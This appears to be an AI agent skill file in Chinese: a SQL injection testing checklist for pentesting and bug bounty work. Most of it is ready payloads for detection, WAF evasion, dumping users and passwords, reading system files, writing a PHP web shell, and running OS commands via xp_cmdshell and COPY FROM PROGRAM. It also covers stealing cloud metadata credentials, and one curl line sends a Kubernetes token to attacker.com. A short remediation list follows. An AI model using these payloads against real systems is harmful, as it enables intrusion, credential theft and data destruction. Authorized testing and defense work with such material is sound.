---
name: claude-red-sqli
description: SQL注入测试方法论清单。覆盖error-based、blind boolean/time-based、UNION、out-of-band、second-order、NoSQL、WAF绕过及SQLmap使用。当用户需要进行SQL注入测试或bug bounty发现数据库注入时触发。
---

# SQL注入（SQLi）测试方法论

## 快捷流程
1. 映射接受用户输入的应用端点
2. 插入测试payload发现漏洞
3. 用不同SQL注入查询从数据库提取信息
4. 扩大成果，提权

## 发现技术

### 参数测试
测试所有输入向量：URL参数、表单字段、Cookie、HTTP头。
插入基本SQL语法字符触发错误：`' " ; -- /* */ # ) ( + ,`

### Error-Based检测
查找泄露信息的数据库错误消息：SQL语法错误、数据库类型和版本、表/列名。

### Blind检测
- Boolean：`' OR 1=1 --`、`' AND 1=2 --`
- Time-based：
  - MySQL：`' OR SLEEP(5) --`
  - PostgreSQL：`' OR pg_sleep(5) --`
  - MSSQL：`' WAITFOR DELAY '0:0:5' --`

### 数据库指纹
```sql
' UNION SELECT @@version -- (MySQL/MSSQL)
' UNION SELECT version() -- (PostgreSQL)
' UNION SELECT banner FROM v$version -- (Oracle)
```

### 映射数据库结构
1. 枚举表：`' UNION SELECT table_name,1 FROM information_schema.tables --`
2. 枚举列：`' UNION SELECT column_name,1 FROM information_schema.columns WHERE table_name='users' --`
3. 提取数据：`' UNION SELECT username,password FROM users --`

## 绕过技术

### WAF绕过
- 大小写：`SeLeCt`、`UnIoN`
- 注释注入：`UN/**/ION SE/**/LECT`
- 编码：URL编码、Hex编码、Unicode编码
- 空格：`UNION/**/SELECT`
- 数字表示：`1` → `CHAR(49)`
- 字符串拼接：MySQL `CONCAT()`、Oracle `||`、MSSQL `+`
- Null byte：`%00' UNION SELECT...`
- Double encoding
- JSON操作符包装：`/**/{"a":1}` 前缀

## 漏洞类型

### NoSQL注入
```javascript
username[$ne]=admin&password[$ne]=
username[$regex]=^adm&password[$regex]=^pass
{"$where": "sleep(5000)"}
```

### ORM/Query Builder陷阱
```javascript
// Sequelize (Node)
sequelize.query('SELECT * FROM users WHERE name = :name', { replacements: { name: user } })

// Prisma
await prisma.$queryRaw`SELECT * FROM users WHERE name = ${user}`

// Knex
knex('users').whereRaw('name = ?', [user])
```

### GraphQL → SQLi
```json
{"query":"query{ users(filter: \"' OR 1=1 --\"){ id email }}"}}
```

### WebSocket SQLi
```javascript
const ws = new WebSocket("wss://target.com/api/search");
ws.send('{"action":"search","query":"test\\\' OR 1=1--"}');
```

### REST API Filter注入
```json
POST /api/users/search
{
  "filter": { "name": {"$regex": "admin' OR 1=1--"} },
  "sort": "name'; DROP TABLE users--"
}
```

## 提权与利用

### MySQL
```sql
' UNION SELECT LOAD_FILE('/etc/passwd') --
' UNION SELECT 'shell code' INTO OUTFILE '/var/www/html/shell.php' --
```

### MSSQL
```sql
'; EXEC xp_cmdshell 'net user' --
'; EXEC ('SELECT * FROM OPENROWSET(''SQLOLEDB'',''Server=linked_server;Trusted_Connection=yes'',''SELECT 1'')') --
```

### PostgreSQL
```sql
' UNION SELECT pg_read_file('/etc/passwd',0,1000) --
'; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec; --
```

### 云元数据SQLi
```sql
-- AWS IMDSv1
' UNION SELECT LOAD_FILE('http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name') --

-- Azure
' UNION SELECT LOAD_FILE('http://169.254.169.254/metadata/instance?api-version=2021-02-01') --
```

### 容器逃逸（PostgreSQL）
```sql
'; COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)'; --
```

## 工具

- **SQLmap 1.8+**：检测JSON-based、GraphQL、WebSocket SQLi
- **GraphQLmap**：CLI工具fuzzing GraphQL resolver注入
- **NoSQLMap**：NoSQL数据库测试
- **Ghauri**：高级blind SQL注入工具（比SQLmap快）
- **Burp Suite Pro**：ML检测增强扫描
- **wscat**：WebSocket SQLi测试

## 修复建议

- 使用Prepared Statements/参数化查询
- PHP PDO：禁用模拟准备 `PDO::ATTR_EMULATE_PREPARES = false`
- ORM框架使用安全参数绑定
- 服务端输入验证 + 强类型检查
- 数据库账户最小权限原则
- WAF + RASP + DAM
- 出站控制：阻止数据库服务器发起DNS/HTTP出站请求
- Row-Level Security (RLS)
